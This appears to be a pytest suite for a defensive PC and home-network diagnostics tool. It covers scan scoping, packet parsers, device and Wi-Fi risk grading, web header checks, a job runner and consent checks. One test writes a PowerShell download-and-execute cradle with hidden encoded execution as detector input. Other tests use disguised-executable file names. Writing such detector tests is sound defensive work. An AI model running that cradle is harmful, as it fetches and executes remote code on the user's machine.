"""Cyber Ops: parsers and graders are pure; jobs run, cancel and keep history; scans need consent."""
import asyncio
import ipaddress
import struct
import time

import pytest
from fastapi import HTTPException

from app.ops import actions, net_probe as net, system_probe as sysp, web_probe as web
from app.ops.jobs import JobRunner, parse_json_tail
from app.routers import ops as ops_router
from app.security import Caller

ME = Caller(user_id="ops-tester")


# ---------- scope: only the PC's own private network ----------

def test_scan_range_is_capped_at_the_pcs_own_slash_24():
    ip = ipaddress.IPv4Address("10.20.30.40")
    assert str(net.scan_range(ip, ipaddress.IPv4Network("10.0.0.0/8"))) == "10.20.30.0/24"
    assert str(net.scan_range(ip, ipaddress.IPv4Network("10.20.30.32/27"))) == "10.20.30.32/27"


def test_hosts_to_probe_skips_self_and_public_networks():
    hosts = net.hosts_to_probe([{"ip": "192.168.1.25", "scan": "192.168.1.0/24"}, {"ip": "8.8.8.8", "scan": "8.8.8.0/24"}])
    assert len(hosts) == 253 and "192.168.1.25" not in hosts
    assert not any(h.startswith("8.8.8.") for h in hosts)


# ---------- parsers ----------

def test_parse_arp_a():
    text = """
Interface: 192.168.1.25 --- 0x7
  Internet Address      Physical Address      Type
  192.168.1.1           20-0c-86-f3-e6-98     dynamic
  192.168.1.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
"""
    assert net.parse_arp_a(text) == [{"ip": "192.168.1.1", "mac": "20-0C-86-F3-E6-98", "state": "dynamic", "alias": None}]


def test_private_mac_and_vendor_lookup():
    oui = net.parse_oui_csv('Registry,Assignment,Organization Name,Organization Address\nMA-L,48EA62,"HP Inc.",addr\nMA-L,200C86,GX India Pvt Ltd,addr\n')
    assert net.vendor_for("48-EA-62-57-C9-5E", oui) == "HP Inc."
    assert net.vendor_for("20:0c:86:f3:e6:98", oui) == "GX India Pvt Ltd"
    assert net.is_private_mac("66-F4-FC-04-3F-32") and net.vendor_for("66-F4-FC-04-3F-32", oui) is None


def _name(n):
    return b"".join(bytes([len(p)]) + p.encode() for p in n.split(".")) + b"\0"


def test_parse_dns_reads_ptr_srv_txt_a_with_compression():
    q = struct.pack("!6H", 0, 0x8400, 0, 4, 0, 0)
    svc = _name("_googlecast._tcp.local")
    ptr_rdata = bytes([10]) + b"Living TV-" + b"\xc0\x0c"  # "Living TV-" + pointer to the service name
    pkt = q + svc + struct.pack("!HHIH", 12, 1, 120, len(ptr_rdata)) + ptr_rdata
    inst_off = 12 + len(svc) + 10
    srv = struct.pack("!HHH", 0, 0, 8009) + _name("tv-1.local")
    pkt += bytes([0xC0, inst_off]) + struct.pack("!HHIH", 33, 1, 120, len(srv)) + srv
    txt = bytes([12]) + b"md=Chromecast" [:12] + bytes([7]) + b"fn=Hall"
    pkt += bytes([0xC0, inst_off]) + struct.pack("!HHIH", 16, 1, 120, len(txt)) + txt
    pkt += _name("tv-1.local") + struct.pack("!HHIH", 1, 1, 120, 4) + bytes([192, 168, 1, 50])
    recs = net.parse_dns(pkt)
    by = {r["type"]: r for r in recs}
    assert by[12]["data"] == "Living TV-._googlecast._tcp.local"
    assert by[33]["data"] == {"port": 8009, "target": "tv-1.local"}
    assert by[16]["data"]["fn"] == "Hall"
    assert by[1]["data"] == "192.168.1.50"


def test_parse_nbstat_picks_the_unique_computer_name():
    hdr = struct.pack("!6H", 0x1337, 0x8400, 0, 1, 0, 0) + bytes([32]) + b"CK" + b"A" * 30 + b"\0" + struct.pack("!HHIH", 0x21, 1, 0, 0)
    names = [(b"WORKGROUP".ljust(15), 0, 0x8400), (b"OFFICE-PC".ljust(15), 0, 0x0400)]
    body = bytes([len(names)]) + b"".join(n + bytes([sfx]) + struct.pack("!H", fl) for n, sfx, fl in names)
    assert net.parse_nbstat(hdr + body) == "OFFICE-PC"


def test_parse_json_tail_skips_warnings():
    assert parse_json_tail("WARNING: slow\r\n{\"a\": 1}") == {"a": 1}
    assert parse_json_tail("[1, 2]") == [1, 2]
    assert parse_json_tail("   ") is None


# ---------- classification and risk ----------

@pytest.mark.parametrize("dev,cat", [
    ({"is_gateway": True}, "Router / gateway"),
    ({"open_ports": [9100]}, "Printer"),
    ({"open_ports": [62078]}, "Phone or tablet"),
    ({"services": ["_googlecast._tcp"]}, "Smart TV / media"),
    ({"vendor": "Prama Hikvision India Private Limited"}, "Camera"),
    ({"vendor": "Qingdao Intelligent&Precise Electronics"}, "Smart TV / media"),
    ({"vendor": "Intel Corporate"}, "Computer"),
    ({"mac_private": True}, "Phone or tablet"),
    ({}, "Unknown device"),
])
def test_classify(dev, cat):
    assert net.classify(dev) == cat


def test_device_security_flags_adb_and_telnet():
    s = net.device_security({"open_ports": [5555, 23], "category": "Smart TV / media"})
    assert s["level"] == "high" and len(s["notes"]) == 2
    assert net.device_security({"open_ports": [445], "category": "Computer"})["level"] == "low"


def test_device_findings_and_os_hint():
    devs = [{"name": "TV", "ip": "192.168.1.13", "open_ports": [5555], "category": "Smart TV / media"},
            {"name": "Router", "ip": "192.168.1.1", "open_ports": [80], "category": "Router / gateway", "is_gateway": True}]
    f = actions.device_findings(devs, audit=True)
    assert f[0]["severity"] == "high" and "5555" in f[0]["title"]
    assert any("plain HTTP" in x["title"] for x in f)
    assert actions.os_hint({"open_ports": [5555]}) == "Android"
    assert actions.os_hint({"netbios": "MYGROUP", "open_ports": [445], "is_gateway": True}) is None


@pytest.mark.parametrize("auth,cipher,sev", [
    ("Open", "None", "high"), ("WEP", "WEP", "high"), ("WPA-Personal", "TKIP", "medium"),
    ("WPA2-Personal", "CCMP", "ok"), ("WPA3-Personal", "GCMP-256", "ok"),
])
def test_grade_wifi(auth, cipher, sev):
    assert net.grade_wifi(auth, cipher)[0] == sev


IFACE = """
    Name                   : Wi-Fi
    State                  : connected
    SSID                   : Home
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Band                   : 5 GHz
    Signal                 : 30%
"""
NETS = """
SSID 1 : Home
    Network type            : Infrastructure
    Authentication          : WPA2-Personal
    Encryption              : CCMP
    BSSID 1                 : 20:0c:86:f3:e6:98
         Signal             : 86%
SSID 2 : Home
    Authentication          : Open
    Encryption              : None
SSID 3 : Cafe
    Authentication          : Open
    Encryption              : None
"""


def test_wifi_analysis_warns_about_weak_signal_and_evil_twin():
    conn, nearby, f = actions.wifi_analysis(IFACE, NETS, "Private")
    assert conn["ssid"] == "Home" and len(nearby) == 3
    titles = " | ".join(x["title"] for x in f)
    assert "Weak signal" in titles and "also called 'Home'" in titles and "Private" in titles
    assert any(x["severity"] == "high" for x in f)


def test_cpu_ram_and_disk_findings():
    s = {"ram_percent": 93, "cpu_percent": 20, "uptime_hours": 300, "ram_total": 8 << 30, "ram_used": 7 << 30,
         "top_mem": [{"name": "chrome.exe", "mem": 3 << 30}], "top_cpu": [{"name": "x", "cpu": 1}]}
    sev = {x["title"].split(" ")[0]: x["severity"] for x in actions.cpu_ram_findings(s)}
    assert sev["Memory"] == "high" and sev["Not"] == "low"
    f = actions.disk_findings([{"mount": "C:\\", "percent": 99, "free": 1 << 30, "total": 256 << 30}], [{"name": "SSD", "health": "Warning", "op": "Degraded"}], 0)
    assert {x["severity"] for x in f} >= {"critical", "high"}


def test_local_port_findings():
    rows = [{"proto": "tcp", "port": 6379, "address": "0.0.0.0", "exposure": "all networks", "pid": 1, "program": "redis"},
            {"proto": "tcp", "port": 5173, "address": "0.0.0.0", "exposure": "all networks", "pid": 2, "program": "node"},
            {"proto": "tcp", "port": 8001, "address": "127.0.0.1", "exposure": "this PC only", "pid": 3, "program": "python"}]
    f = actions.port_findings(rows)
    assert f[0]["severity"] == "high" and "Redis" in f[0]["title"]
    assert any("5173" in x["title"] for x in f) and not any("8001" in x["title"] for x in f)


# ---------- files ----------

def test_name_flags_and_type_mismatch(tmp_path):
    assert sysp.name_flags("invoice.pdf.exe")[0][0] == "high"
    assert sysp.name_flags("photo\u202egpj.exe")[0][0] == "high"
    assert sysp.name_flags("report.pdf") == []
    fake = tmp_path / "holiday.jpg"
    fake.write_bytes(b"MZ\x90\x00" + b"\0" * 60)
    assert sysp.type_mismatch(fake, fake.read_bytes()[:16])[0] == "high"
    real = tmp_path / "setup.exe"
    real.write_bytes(b"MZ\x90\x00")
    assert sysp.type_mismatch(real, b"MZ\x90\x00") is None


def test_script_red_flags(tmp_path):
    s = tmp_path / "run.ps1"
    s.write_text("$x = (New-Object Net.WebClient).DownloadString('http://x'); iex $x; powershell -w hidden -enc " + "A" * 60)
    flags = sysp.script_flags(s)
    assert len(flags) >= 3


# ---------- websites ----------

def test_normalize_url():
    assert web.normalize_url("example.com") == "https://example.com/"
    with pytest.raises(ValueError):
        web.normalize_url("ftp://example.com")


def test_private_sites_refused_on_a_server():
    with pytest.raises(ValueError):
        web.check_target_allowed("127.0.0.1", allow_private=False)
    assert web.check_target_allowed("127.0.0.1", allow_private=True) == ["127.0.0.1"]


def test_grade_headers_maps_to_owasp():
    tls = {"days_left": 5, "expires": "2026-11-27", "issuer": "R3", "version": "TLSv1.3", "cipher": "X"}
    f = web.grade_headers({"Server": "nginx/1.18.0"}, ["sessionid=abc; Path=/"], False, tls, None)
    by = {x["title"]: x for x in f}
    assert by["Certificate expires soon"]["severity"] == "high"
    assert by["No HSTS header"]["owasp"].startswith("A05")
    assert by["Server software version is advertised"]["owasp"].startswith("A06")
    assert by["Cookie 'sessionid' lacks Secure, HttpOnly, SameSite"]["severity"] == "medium"
    good = web.grade_headers({"Strict-Transport-Security": "max-age=31536000", "Content-Security-Policy": "default-src 'self'",
                              "X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff", "Referrer-Policy": "no-referrer",
                              "Permissions-Policy": "camera=()"}, ["id=1; Secure; HttpOnly; SameSite=Lax"], True, {**tls, "days_left": 80}, None)
    assert {x["severity"] for x in good} == {"ok"}


# ---------- jobs ----------

def _runner(tmp_path, monkeypatch):
    monkeypatch.setattr("app.ops.jobs.HISTORY_FILE", tmp_path / "h.json")
    return JobRunner()


def _wait(job, seconds=10):
    assert job.finished.wait(seconds)


def test_job_records_steps_result_and_history(tmp_path, monkeypatch):
    r = _runner(tmp_path, monkeypatch)

    def fn(ctx, params):
        with ctx.step("one") as s:
            s["detail"] = "fine"
        ctx.soft_step("two", lambda: 1 / 0)
        return {"summary": "ok", "findings": []}

    job = r.start("u1", "t", "Test", {}, fn)
    _wait(job)
    assert job.status == "done" and [s["status"] for s in job.steps] == ["done", "failed"]
    assert "ZeroDivisionError" in job.steps[1]["detail"]
    again = _runner(tmp_path, monkeypatch)
    assert again.get("u1", job.id).result["summary"] == "ok"
    assert again.get("someone-else", job.id) is None


def test_cancel_stops_a_job_and_kills_its_process(tmp_path, monkeypatch):
    import sys
    r = _runner(tmp_path, monkeypatch)

    def fn(ctx, params):
        with ctx.step("long"):
            ctx.run([sys.executable, "-c", "import time; time.sleep(30)"], timeout=60)
        return {"summary": "should not finish"}

    job = r.start("u1", "t", "Test", {}, fn)
    time.sleep(0.5)
    assert r.stop_all("u1") == 1
    _wait(job)
    assert job.status == "cancelled" and job.steps[0]["status"] == "cancelled"


def test_failed_job_keeps_the_error(tmp_path, monkeypatch):
    r = _runner(tmp_path, monkeypatch)
    job = r.start("u1", "t", "Test", {}, lambda ctx, p: (_ for _ in ()).throw(RuntimeError("no wifi")))
    _wait(job)
    assert job.status == "failed" and "no wifi" in job.error


# ---------- API ----------

def test_network_scans_need_consent():
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="network", params={}), ME))
    assert e.value.status_code == 428
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="devices", params={"authorized": "yes"}), ME))
    assert e.value.status_code == 428  # only a real true counts


def test_unknown_action_and_bad_inputs():
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="crack_wifi", params={}), ME))
    assert e.value.status_code == 404
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="website", params={"url": "a b"}), ME))
    assert e.value.status_code == 422


def test_server_mode_refuses(monkeypatch):
    monkeypatch.setattr("app.routers.ops.settings.system_control", False)
    listing = asyncio.run(ops_router.list_actions())
    assert listing["supported"] is False and len(listing["actions"]) == 17
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="cpu_ram", params={}), ME))
    assert e.value.status_code == 409


def test_catalog_covers_every_quick_action():
    ids = {a["id"] for a in actions.catalog()}
    assert ids == {"laptop", "devices", "network", "ip", "security", "hardware", "cpu_ram", "disk", "files", "speed",
                   "bluetooth", "wifi", "website", "ports", "report", "emergency", "investigate"}
    from app.agent.tools import DIAGNOSTICS
    assert set(DIAGNOSTICS) == ids


# ---------- OSINT (global intelligence) ----------

from app.ops import osint


def test_osint_refuses_private_and_junk_targets():
    for bad in ["192.168.1.1", "10.0.0.5", "127.0.0.1", "169.254.1.1", "::1", "fe80::1"]:
        with pytest.raises(ValueError):
            osint.normalize_target(bad)
    for bad in ["", "not a domain", "no-dot", "http://"]:
        with pytest.raises(ValueError):
            osint.normalize_target(bad)


def test_osint_accepts_public_ip_and_strips_url():
    assert osint.normalize_target("1.1.1.1") == ("ip", "1.1.1.1", ["1.1.1.1"])
    kind, host, _ = osint.normalize_target("https://Example.COM/path?x=1")
    assert kind == "domain" and host == "example.com"


def test_osint_target_param_required(monkeypatch):
    with pytest.raises(HTTPException) as e:
        asyncio.run(ops_router.run(ops_router.RunIn(action="investigate", params={"target": "a b"}), ME))
    assert e.value.status_code == 422
    # a valid-looking target is accepted by validation (the job itself runs in the background)
    assert ops_router._check_params("investigate", {"target": "example.com"})["target"] == "example.com"
